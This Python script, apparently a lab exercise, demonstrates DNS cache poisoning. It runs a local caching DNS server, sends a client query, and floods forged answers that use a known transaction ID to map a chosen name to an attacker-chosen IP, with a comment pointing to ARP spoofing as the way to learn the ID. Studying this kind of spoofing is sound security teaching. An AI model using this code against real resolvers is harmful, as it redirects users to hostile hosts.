from dnslib import DNSRecord, DNSHeader, DNSQuestion, QTYPE, RR, A
from dns_server import DNSCacheServer
from threading import Thread
import logging
import socket
import binascii
import sys

logging.basicConfig(level=logging.WARNING)

ID = 35859


# def generate_id():
#     for id in range(0, 65536):
#         yield id


def send_dns_packet(sock, server_addr, name, ip, id):
    """
    Construct and send dns packet
    """
    ans = DNSRecord(DNSHeader(id=id, qr=1))
    ans.add_question(DNSQuestion(name))
    ans.add_answer(RR(name, ttl=3600, rdata=A(ip)))
    # print(ans)
    sock.sendto(ans.pack(), (server_addr, 7131))


def send_spoof_data(server_addr, name, ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for i in range(1, 100):
        #
        # sock.connect((server_addr, 7131))
        # if i // 10 == 0:
        logging.warning("Sending {} packet".format(i))
        send_dns_packet(sock, server_addr, name, ip, ID)


def send_req_to_server(server_addr, name):
    client_req = DNSRecord(DNSHeader(id=ID), q=DNSQuestion(name, getattr(QTYPE, "A")))
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect((server_addr, 53))
    s.send(client_req.pack())
    resp = s.recv(2048)
    dns_resp = DNSRecord.parse(resp)
    logging.warning("Got answer from server {}".format(dns_resp))


if __name__ == '__main__':
    server_addr = sys.argv[1]
    ip = sys.argv[2]
    name = sys.argv[3]

    # Start DNS server
    s = DNSCacheServer(server_addr, 53, "8.8.8.8")
    Thread(target=s.run_server, args=()).start()

    # At some moment client ask server about "name"
    # Lets make an assumption that we somehow know the "ID" of client packet
    # (May be by ARP spoofing)
    Thread(target=send_req_to_server, args=(server_addr, name)).start()

    # Start sending spoofed packets
    Thread(target=send_spoof_data, args=(server_addr, name, ip)).start()

